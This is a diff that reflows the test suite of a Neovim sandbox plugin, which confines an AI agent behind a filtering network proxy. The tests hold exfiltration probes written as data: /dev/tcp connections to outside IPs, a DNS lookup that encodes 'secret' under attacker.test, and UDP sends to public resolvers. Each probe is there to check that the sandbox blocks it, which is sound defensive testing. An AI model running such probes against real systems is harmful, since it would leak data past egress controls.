@@ -148,8 +148,23 @@ describe("allowlist entries", function()
   end)
 
   it("refuses IP literals, single labels, bad wildcards, IPv6 and odd ports", function()
-    for _, bad in ipairs({ "1.2.3.4", "127.0.0.1:80", "localhost", "0x7f.1", "2130706433", "*.com", "*", "[::1]:443",
-      "a b.com", "a..com", "-a.com", "example.com:0", "example.com:70000", "", "::1" }) do
+    for _, bad in ipairs({
+      "1.2.3.4",
+      "127.0.0.1:80",
+      "localhost",
+      "0x7f.1",
+      "2130706433",
+      "*.com",
+      "*",
+      "[::1]:443",
+      "a b.com",
+      "a..com",
+      "-a.com",
+      "example.com:0",
+      "example.com:70000",
+      "",
+      "::1",
+    }) do
       H.not_ok(net.parse_entry(bad), bad)
     end
   end)
@@ -179,9 +194,28 @@ end)
 
 describe("address check", function()
   it("refuses loopback, private, link-local, metadata, multicast and mapped forms", function()
-    for _, ip in ipairs({ "127.0.0.1", "10.1.2.3", "172.16.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0",
-      "224.0.0.1", "::1", "::", "fe80::1", "fc00::1", "fd12::1", "ff02::1", "::ffff:127.0.0.1", "::ffff:7f00:1",
-      "::ffff:a9fe:a9fe", "64:ff9b::7f00:1", "2001:db8::1", "not-an-ip" }) do
+    for _, ip in ipairs({
+      "127.0.0.1",
+      "10.1.2.3",
+      "172.16.0.1",
+      "192.168.1.1",
+      "169.254.169.254",
+      "100.64.0.1",
+      "0.0.0.0",
+      "224.0.0.1",
+      "::1",
+      "::",
+      "fe80::1",
+      "fc00::1",
+      "fd12::1",
+      "ff02::1",
+      "::ffff:127.0.0.1",
+      "::ffff:7f00:1",
+      "::ffff:a9fe:a9fe",
+      "64:ff9b::7f00:1",
+      "2001:db8::1",
+      "not-an-ip",
+    }) do
       H.not_ok(net.is_public_ip(ip), ip)
     end
   end)
@@ -234,7 +268,14 @@ describe("the filtering proxy", function()
   it("blocks raw IPs, also ones that look like allowed ports and forms like 0x7f.1", function()
     stub_resolver({})
     local p = start_proxy({ "allowed.test" })
-    for _, t in ipairs({ "93.184.216.34:443", "127.0.0.1:443", "[::1]:443", "0x7f.1:443", "2130706433:443", "localhost:443" }) do
+    for _, t in ipairs({
+      "93.184.216.34:443",
+      "127.0.0.1:443",
+      "[::1]:443",
+      "0x7f.1:443",
+      "2130706433:443",
+      "localhost:443",
+    }) do
       local r = ask(p.sock, ("CONNECT %s HTTP/1.1\r\n\r\n"):format(t))
       H.match(r, "HTTP/1.1 403", true, t)
     end
@@ -288,7 +329,12 @@ end)
 
 describe("the plan and the preview", function()
   local function plan_for(m, project, tmp)
-    return m.plan({ "agent" }, project, tmp, { aux = { empty = "/aux/empty", claude_json = "/aux/cj", net_dir = "/aux/net" } })
+    return m.plan(
+      { "agent" },
+      project,
+      tmp,
+      { aux = { empty = "/aux/empty", claude_json = "/aux/cj", net_dir = "/aux/net" } }
+    )
   end
   local function need()
     if real_mod.status_blocking().mode ~= "bwrap" then
@@ -317,38 +363,50 @@ describe("the plan and the preview", function()
       end
       H.ok(found, n)
     end
-    local names = vim.tbl_map(function(h) return h.host end, p.net.hosts)
+    local names = vim.tbl_map(function(h)
+      return h.host
+    end, p.net.hosts)
     H.eq(m.default_hosts, names)
   end)
 
-  it("network = 'open' has no --unshare-net, no proxy variables and no net section; anything but 'open' is filtered", function()
-    need()
-    local m = load_for(fake_home())
-    m.config.network = "open"
-    local p = plan_for(m, H.tmpdir(), H.tmpdir())
-    H.eq("open", p.network)
-    H.eq(nil, p.net)
-    local a = m.argv(p)
-    H.not_ok(vim.tbl_contains(a, "--unshare-net"))
-    H.not_ok(vim.tbl_contains(a, "HTTPS_PROXY"))
-    for _, v in ipairs({ "OPEN", "opne", "none", true, false, 0 }) do
-      m.config.network = v
-      H.eq("filtered", plan_for(m, H.tmpdir(), H.tmpdir()).network, vim.inspect(v))
+  it(
+    "network = 'open' has no --unshare-net, no proxy variables and no net section; anything but 'open' is filtered",
+    function()
+      need()
+      local m = load_for(fake_home())
+      m.config.network = "open"
+      local p = plan_for(m, H.tmpdir(), H.tmpdir())
+      H.eq("open", p.network)
+      H.eq(nil, p.net)
+      local a = m.argv(p)
+      H.not_ok(vim.tbl_contains(a, "--unshare-net"))
+      H.not_ok(vim.tbl_contains(a, "HTTPS_PROXY"))
+      for _, v in ipairs({ "OPEN", "opne", "none", true, false, 0 }) do
+        m.config.network = v
+        H.eq("filtered", plan_for(m, H.tmpdir(), H.tmpdir()).network, vim.inspect(v))
+      end
     end
-  end)
+  )
 
   it("allow_hosts replaces the default list; setup validates network and the entries", function()
     need()
     local m = load_for(fake_home())
     m.config.allow_hosts = { "github.com", "*.example.org:8443" }
     local p = plan_for(m, H.tmpdir(), H.tmpdir())
-    H.eq({ "github.com", "*.example.org:8443" }, vim.tbl_map(function(h) return h.host end, p.net.hosts))
+    H.eq(
+      { "github.com", "*.example.org:8443" },
+      vim.tbl_map(function(h)
+        return h.host
+      end, p.net.hosts)
+    )
     H.eq("allow_hosts", p.net.hosts[1].why)
     H.eq({}, m.validate_opts({ network = "open", allow_hosts = { "github.com" } }))
     H.ok(#m.validate_opts({ network = "off" }) > 0)
     H.ok(#m.validate_opts({ allow_hosts = { "1.2.3.4" } }) > 0)
     H.ok(#m.validate_opts({ allow_hosts = { "*.com" } }) > 0)
-    H.throws(function() m.setup({ network = true }) end, "network")
+    H.throws(function()
+      m.setup({ network = true })
+    end, "network")
   end)
 
   it("the preview lists the allowlist and says OPEN for an open network", function()
@@ -374,7 +432,12 @@ describe("the plan and the preview", function()
     H.eq({ kind = "host", value = "github.com", scope = "once" }, e)
     local log = store.read_log()
     H.eq({ "host", "approved", "github.com" }, { log[1].kind, log[1].decision, log[1].host })
-    local p = real_mod.plan({ "agent" }, project, tmp, { exceptions = { e }, aux = { empty = "/e", claude_json = "/c", net_dir = "/n" } })
+    local p = real_mod.plan(
+      { "agent" },
+      project,
+      tmp,
+      { exceptions = { e }, aux = { empty = "/e", claude_json = "/c", net_dir = "/n" } }
+    )
     local last = p.net.hosts[#p.net.hosts]
     H.eq({ "github.com", "approved exception" }, { last.host, last.why })
     H.match(table.concat(require("xyno_sandbox.ui").lines(p), "\n"), "host github.com  [once]", true)
@@ -397,10 +460,28 @@ describe("the plan and the preview", function()
 
   it("a host exception on an open network is ignored with a reason", function()
     local p = plan_mod.build({
-      project = "/h/proj", tmp_dir = "/h/t", home = "/h", cmd = { "a" }, config = { network = "open" },
+      project = "/h/proj",
+      tmp_dir = "/h/t",
+      home = "/h",
+      cmd = { "a" },
+      config = { network = "open" },
       exceptions = { { kind = "host", value = "github.com", scope = "once" } },
-      probes = { stat_type = function() end, exists = function() return false end, list = function() return {} end,
-        glob = function() return {} end, read_line = function() end, realpath = function(x) return x end },
+      probes = {
+        stat_type = function() end,
+        exists = function()
+          return false
+        end,
+        list = function()
+          return {}
+        end,
+        glob = function()
+          return {}
+        end,
+        read_line = function() end,
+        realpath = function(x)
+          return x
+        end,
+      },
     })
     H.eq(0, #p.exceptions)
     H.match(p.rejected[1].reason, "open", true)
@@ -438,8 +519,13 @@ describe("inside the sandbox", function()
     net.allow_private = true
     local home = fake_home()
     local m = load_for(home)
-    local r, h = run_in(m, home, 'echo "proxy=$HTTPS_PROXY"\n' .. via_proxy("allowed.test:" .. port, true), H.tmpdir(),
-      { "allowed.test:" .. port })
+    local r, h = run_in(
+      m,
+      home,
+      'echo "proxy=$HTTPS_PROXY"\n' .. via_proxy("allowed.test:" .. port, true),
+      H.tmpdir(),
+      { "allowed.test:" .. port }
+    )
     h.release()
     H.eq(0, r.code, r.stdout .. r.stderr)
     H.match(r.stdout, "proxy=http://127.0.0.1:3128", true)
@@ -462,8 +548,11 @@ describe("inside the sandbox", function()
         seen[#seen + 1] = msg
       end
     end
-    local r, h = run_in(m, home, via_proxy("evil.test:443") .. "\n" .. via_proxy("evil.test:443"), H.tmpdir(), { "allowed.test" })
-    wait_for(function() return #store.read_log() > 0 end)
+    local r, h =
+      run_in(m, home, via_proxy("evil.test:443") .. "\n" .. via_proxy("evil.test:443"), H.tmpdir(), { "allowed.test" })
+    wait_for(function()
+      return #store.read_log() > 0
+    end)
     vim.notify = orig
     local blocked = h.blocked()
     h.release()
@@ -477,60 +566,74 @@ describe("inside the sandbox", function()
     H.match(seen[1], "blocked network access to evil.test:443", true)
   end)
 
-  it("raw IPs are blocked: no route out of the sandbox, host loopback listeners are unreachable, the proxy refuses IP targets", function()
-    local port = echo_server() -- on the HOST's 127.0.0.1
-    stub_resolver({})
-    local home = fake_home()
-    local m = load_for(home)
-    local script = table.concat({
-      "(exec 3<>/dev/tcp/1.1.1.1/443) 2>/dev/null && echo direct_ip=REACHED || echo direct_ip=blocked",
-      "(exec 3<>/dev/tcp/93.184.216.34/443) 2>/dev/null && echo direct_ip2=REACHED || echo direct_ip2=blocked",
-      "(exec 3<>/dev/tcp/127.0.0.1/" .. port .. ") 2>/dev/null && echo host_loopback=REACHED || echo host_loopback=blocked",
-      "(exec 3<>/dev/tcp/::1/" .. port .. ") 2>/dev/null && echo host_loopback6=REACHED || echo host_loopback6=blocked",
-      via_proxy("93.184.216.34:443"),
-      via_proxy("127.0.0.1:" .. port),
-    }, "\n")
-    local r, h = run_in(m, home, script, H.tmpdir(), { "allowed.test" })
-    h.release()
-    H.match(r.stdout, "direct_ip=blocked", true)
-    H.match(r.stdout, "direct_ip2=blocked", true)
-    H.match(r.stdout, "host_loopback=blocked", true)
-    H.match(r.stdout, "host_loopback6=blocked", true)
-    H.no_match(r.stdout, "REACHED", true)
-    local n = select(2, r.stdout:gsub("status=HTTP/1.1 403", ""))
-    H.eq(2, n)
-    H.eq({}, lookups)
-  end)
+  it(
+    "raw IPs are blocked: no route out of the sandbox, host loopback listeners are unreachable, the proxy refuses IP targets",
+    function()
+      local port = echo_server() -- on the HOST's 127.0.0.1
+      stub_resolver({})
+      local home = fake_home()
+      local m = load_for(home)
+      local script = table.concat({
+        "(exec 3<>/dev/tcp/1.1.1.1/443) 2>/dev/null && echo direct_ip=REACHED || echo direct_ip=blocked",
+        "(exec 3<>/dev/tcp/93.184.216.34/443) 2>/dev/null && echo direct_ip2=REACHED || echo direct_ip2=blocked",
+        "(exec 3<>/dev/tcp/127.0.0.1/"
+          .. port
+          .. ") 2>/dev/null && echo host_loopback=REACHED || echo host_loopback=blocked",
+        "(exec 3<>/dev/tcp/::1/"
+          .. port
+          .. ") 2>/dev/null && echo host_loopback6=REACHED || echo host_loopback6=blocked",
+        via_proxy("93.184.216.34:443"),
+        via_proxy("127.0.0.1:" .. port),
+      }, "\n")
+      local r, h = run_in(m, home, script, H.tmpdir(), { "allowed.test" })
+      h.release()
+      H.match(r.stdout, "direct_ip=blocked", true)
+      H.match(r.stdout, "direct_ip2=blocked", true)
+      H.match(r.stdout, "host_loopback=blocked", true)
+      H.match(r.stdout, "host_loopback6=blocked", true)
+      H.no_match(r.stdout, "REACHED", true)
+      local n = select(2, r.stdout:gsub("status=HTTP/1.1 403", ""))
+      H.eq(2, n)
+      H.eq({}, lookups)
+    end
+  )
 
-  it("DNS exfiltration fails: no resolver is reachable, UDP never leaves, and the proxy resolves only allowed names", function()
-    stub_resolver({})
-    local got = {}
-    local udp = uv.new_udp()
-    assert(udp:bind("127.0.0.1", 0))
-    udp:recv_start(function(_, data) got[#got + 1] = data end)
-    local uport = udp:getsockname().port
-    local home = fake_home()
-    local m = load_for(home)
-    local script = table.concat({
-      "getent hosts c2VjcmV0LWRhdGE.attacker.test >/dev/null 2>&1 && echo dns=RESOLVED || echo dns=failed",
-      "getent hosts one.one.one.one >/dev/null 2>&1 && echo dns2=RESOLVED || echo dns2=failed",
-      "(echo secret > /dev/udp/127.0.0.1/" .. uport .. ") 2>/dev/null; echo udp_loopback=sent",
-      "(echo secret > /dev/udp/8.8.8.8/53) 2>/dev/null && echo udp_ext=SENT || echo udp_ext=blocked",
-      "(echo secret > /dev/udp/1.1.1.1/53) 2>/dev/null && echo udp_ext2=SENT || echo udp_ext2=blocked",
-      via_proxy("c2VjcmV0LWRhdGE.attacker.test:443"),
-    }, "\n")
-    local r, h = run_in(m, home, script, H.tmpdir(), { "allowed.test" })
-    h.release()
-    vim.wait(300, function() return #got > 0 end)
-    udp:close()
-    H.match(r.stdout, "dns=failed", true)
-    H.match(r.stdout, "dns2=failed", true)
-    H.match(r.stdout, "udp_ext=blocked", true)
-    H.match(r.stdout, "udp_ext2=blocked", true)
-    H.eq({}, got, "nothing reached the host's loopback over UDP")
-    H.match(r.stdout, "status=HTTP/1.1 403", true)
-    H.eq({}, lookups, "the exfil name was never looked up on the host")
-  end)
+  it(
+    "DNS exfiltration fails: no resolver is reachable, UDP never leaves, and the proxy resolves only allowed names",
+    function()
+      stub_resolver({})
+      local got = {}
+      local udp = uv.new_udp()
+      assert(udp:bind("127.0.0.1", 0))
+      udp:recv_start(function(_, data)
+        got[#got + 1] = data
+      end)
+      local uport = udp:getsockname().port
+      local home = fake_home()
+      local m = load_for(home)
+      local script = table.concat({
+        "getent hosts c2VjcmV0LWRhdGE.attacker.test >/dev/null 2>&1 && echo dns=RESOLVED || echo dns=failed",
+        "getent hosts one.one.one.one >/dev/null 2>&1 && echo dns2=RESOLVED || echo dns2=failed",
+        "(echo secret > /dev/udp/127.0.0.1/" .. uport .. ") 2>/dev/null; echo udp_loopback=sent",
+        "(echo secret > /dev/udp/8.8.8.8/53) 2>/dev/null && echo udp_ext=SENT || echo udp_ext=blocked",
+        "(echo secret > /dev/udp/1.1.1.1/53) 2>/dev/null && echo udp_ext2=SENT || echo udp_ext2=blocked",
+        via_proxy("c2VjcmV0LWRhdGE.attacker.test:443"),
+      }, "\n")
+      local r, h = run_in(m, home, script, H.tmpdir(), { "allowed.test" })
+      h.release()
+      vim.wait(300, function()
+        return #got > 0
+      end)
+      udp:close()
+      H.match(r.stdout, "dns=failed", true)
+      H.match(r.stdout, "dns2=failed", true)
+      H.match(r.stdout, "udp_ext=blocked", true)
+      H.match(r.stdout, "udp_ext2=blocked", true)
+      H.eq({}, got, "nothing reached the host's loopback over UDP")
+      H.match(r.stdout, "status=HTTP/1.1 403", true)
+      H.eq({}, lookups, "the exfil name was never looked up on the host")
+    end
+  )
 
   it("in network = 'open' mode the sandbox shares the host network and no proxy runs", function()
     local port = echo_server()
@@ -541,7 +644,11 @@ describe("inside the sandbox", function()
     local tmp = H.tmpdir()
     local project = H.tmpdir()
     local prev = vim.fn.chdir(project)
-    local cmd, _, h = m.wrap({ "bash", "-c", "(exec 3<>/dev/tcp/127.0.0.1/" .. port .. ") 2>/dev/null && echo open=reached; echo p=[$HTTPS_PROXY]" }, project, tmp)
+    local cmd, _, h = m.wrap({
+      "bash",
+      "-c",
+      "(exec 3<>/dev/tcp/127.0.0.1/" .. port .. ") 2>/dev/null && echo open=reached; echo p=[$HTTPS_PROXY]",
+    }, project, tmp)
     vim.fn.chdir(prev)
     H.eq(nil, h.proxy)
     local r = vim.system(cmd, { cwd = project, text = true, env = { HOME = home, HTTPS_PROXY = "" } }):wait(60000)
@@ -578,7 +685,9 @@ describe("fail closed", function()
   it("a proxy that cannot start means the agent does not start", function()
     H.need_sandbox()
     local orig = net.start
-    net.start = function() return nil, "boom" end
+    net.start = function()
+      return nil, "boom"
+    end
     local ok, m, a, err = pcall(wrap_fresh)
     net.start = orig
     assert(ok, m)
@@ -592,7 +701,9 @@ describe("fail closed", function()
   it("a proxy that raises means the agent does not start", function()
     H.need_sandbox()
     local orig = net.start
-    net.start = function() error("kaput") end
+    net.start = function()
+      error("kaput")
+    end
     local ok, m, a, err = pcall(wrap_fresh)
     net.start = orig
     assert(ok, m)
@@ -600,19 +711,27 @@ describe("fail closed", function()
     H.match(err, "kaput", true)
   end)
 
-  it("a socket that cannot be bound (path too long) means the agent does not start, and leaves nothing behind", function()
-    H.need_sandbox()
-    local home = fake_home()
-    local m = load_for(home)
-    local project = H.tmpdir()
-    local long = H.tmpdir() .. "/" .. string.rep("d", 120)
-    local aux = H.tmpdir()
-    local plan = m.plan({ "echo" }, project, H.tmpdir(), { aux = { empty = aux .. "/e", claude_json = aux .. "/c", net_dir = long } })
-    local a, err = m.wrap({ "echo" }, project, H.tmpdir(), { plan = plan })
-    H.eq(nil, a)
-    H.match(err, "network egress cannot be enforced", true)
-    H.not_ok(uv.fs_stat(long))
-  end)
+  it(
+    "a socket that cannot be bound (path too long) means the agent does not start, and leaves nothing behind",
+    function()
+      H.need_sandbox()
+      local home = fake_home()
+      local m = load_for(home)
+      local project = H.tmpdir()
+      local long = H.tmpdir() .. "/" .. string.rep("d", 120)
+      local aux = H.tmpdir()
+      local plan = m.plan(
+        { "echo" },
+        project,
+        H.tmpdir(),
+        { aux = { empty = aux .. "/e", claude_json = aux .. "/c", net_dir = long } }
+      )
+      local a, err = m.wrap({ "echo" }, project, H.tmpdir(), { plan = plan })
+      H.eq(nil, a)
+      H.match(err, "network egress cannot be enforced", true)
+      H.not_ok(uv.fs_stat(long))
+    end
+  )
 
   it("a missing nvim for the relay means the agent does not start", function()
     H.need_sandbox()
@@ -650,8 +769,12 @@ describe("fail closed", function()
   it("a bwrap without a usable network namespace is a failed readiness probe: refused, with the reason", function()
     local probe = require("xyno_sandbox.probe")
     probe.net = true
-    local reason, hint = probe.diagnose({ code = 1, stderr = "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" },
-      function() return nil end)
+    local reason, hint = probe.diagnose(
+      { code = 1, stderr = "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" },
+      function()
+        return nil
+      end
+    )
     probe.net = false
     H.match(reason, "isolated network namespace", true)
     H.match(hint, "not started", true)
@@ -678,8 +801,17 @@ end)
 describe("docs", function()
   it("README and help state the filtered default, the OPEN opt-out and the limits that remain", function()
     local text = H.docs_text()
-    for _, s in ipairs({ "network = \"open\"", "allow_hosts", "--unshare-net", "CONNECT", "no DNS", "raw IP",
-      "allowed host", "TLS", "SNI" }) do
+    for _, s in ipairs({
+      'network = "open"',
+      "allow_hosts",
+      "--unshare-net",
+      "CONNECT",
+      "no DNS",
+      "raw IP",
+      "allowed host",
+      "TLS",
+      "SNI",
+    }) do
       H.match(text, s, true)
     end
     H.no_match(text, "the network is open: the preview shows it", true)
